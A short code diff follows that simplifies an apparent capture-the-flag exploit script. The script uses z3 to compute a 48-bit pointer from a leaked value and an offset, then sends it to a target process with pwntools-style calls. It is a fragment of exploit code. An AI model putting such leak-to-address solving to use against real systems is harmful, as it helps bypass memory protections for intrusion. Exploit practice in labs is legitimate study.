@@ -1,7 +1,6 @@
 from z3 import *
-def XxX(leaked, off, orecal):
+def XxX(leaked, off):
     leaked = BitVecVal(leaked, 48)
-    # orecal = BitVecVal(orecal, 48)
     off  = BitVecVal(off,48)
 
     res  = BitVec('res', 48)
@@ -34,7 +33,7 @@ if __name__ == "__main__":
         leaked = recv_num()
         off = recv_num()
         # orecal = recv_num()
-        res = XxX(leaked,off,0)
+        res = XxX(leaked,off)
         print(hex(res))
 
         p.send(p64(res))
